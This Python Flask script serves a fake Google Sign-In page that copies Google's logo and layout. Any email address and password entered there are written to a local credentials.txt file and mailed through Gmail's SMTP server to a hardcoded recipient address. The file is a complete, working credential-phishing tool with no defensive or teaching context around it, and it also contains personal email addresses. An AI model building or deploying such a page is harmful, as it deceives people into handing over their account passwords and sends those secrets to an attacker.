from flask import Flask, request
import smtplib
from email.message import EmailMessage
import webbrowser
import threading

def mail(content):
    # Email Configuration
    sender_email = "parthib.soursh@gmail.com"
    receiver_email = "banerjeeparthib63@gmail.com"
    password = PASS  # Use an App Password if using Gmail

    # Create Email
    msg = EmailMessage()
    msg["Subject"] = "subject"
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg.set_content(content)

    # Send Email
    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:  # Using SSL
            server.login(sender_email, password)
            server.send_message(msg)
    except Exception as e:
        print(f"Error: {e}")
        
app = Flask(__name__)

@app.route('/')
def home():
    return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Sign-In</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f8f9fa;
        }
        .login-container {
            text-align: center;
            background: white;
            padding: 40px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
            width: 360px;
        }
        .login-container img {
            width: 80px;
            margin-bottom: 20px;
        }
        h2 {
            font-size: 24px;
            font-weight: 500;
            margin-bottom: 10px;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            cursor: pointer;
            border: none;
            background-color: #1a73e8;
            color: white;
            border-radius: 4px;
            font-weight: 500;
        }
        button:hover {
            background-color: #1765c0;
        }
        .forgot-password {
            display: block;
            margin-top: 10px;
            font-size: 14px;
            color: #1a73e8;
            text-decoration: none;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo">
        <h2>Sign in</h2>
        <form action="http://localhost:5000/save-credentials" method="POST">
            <input type="email" placeholder="Email or phone" name="username" required>
            <input type="password" placeholder="Password" name="password" required>
            <button type="submit">Next</button>
        </form>
        <a href="#" class="forgot-password">Forgot password?</a>
    </div>
</body>
</html>
"""

@app.route('/save-credentials', methods=['POST'])
def save_credentials():
    username = request.form.get('username')
    password = request.form.get('password')

    with open("credentials.txt", "a") as file:
        file.write(f"Username: {username}\nPassword: {password}\n\n")
        mail(f"Username: {username}\nPassword: {password}")

    return "Signing in...", 200

if __name__ == '__main__':
    app.run(host='localhost', port=5000, debug=True)
